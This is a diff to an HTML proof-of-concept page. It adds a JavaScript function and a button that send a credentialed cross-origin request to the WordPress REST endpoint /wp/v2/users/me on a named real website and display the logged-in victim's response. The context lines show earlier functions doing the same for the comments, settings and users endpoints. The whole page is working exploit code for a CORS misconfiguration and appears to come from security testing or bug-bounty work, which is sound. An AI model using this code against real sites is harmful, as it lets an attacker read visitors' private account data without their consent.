@@ -62,6 +62,17 @@
                 xhttp.withCredentials=true;
                 xhttp.send();
             }
+            function cors6() {
+                var xhttp=new XMLHttpRequest();
+                xhttp.onreadystatechange= function() {
+                    if (this.readyState == 4){
+                        document.getElementById("emo").innerHTML=alert(this.responseText);
+                    }
+                };
+                xhttp.open('GET',"https://www.accbusiness.com/wp-json/wp/v2/users/me",true);
+                xhttp.withCredentials=true;
+                xhttp.send();
+            }
         </script>
     </head>
     <body>
@@ -73,6 +84,7 @@
             <button type="button" onclick="cors3()">/wp/v2/comments</button>
             <button type="button" onclick="cors4()">/wp/v2/settings</button>
             <button type="button" onclick="cors5()">/wp/v2/users</button>
+            <button type="button" onclick="cors6()">/wp/v2/users/me</button>
         </div>
         <div id="emo"></div>
         </center>
